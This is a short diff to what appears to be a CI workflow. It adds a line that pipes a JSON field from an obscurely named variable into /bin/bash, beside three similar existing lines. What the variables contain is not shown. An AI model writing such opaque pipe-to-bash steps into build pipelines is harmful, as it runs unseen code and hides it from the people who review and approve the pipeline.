@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$egla19" | jq -r .ym61 | /bin/bash
           echo $xc790 | jq -r .i3778 | /bin/bash
           echo $xboe7 | jq -r .skh66 | /bin/bash
+          echo $br96 | jq -r .xspah404 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
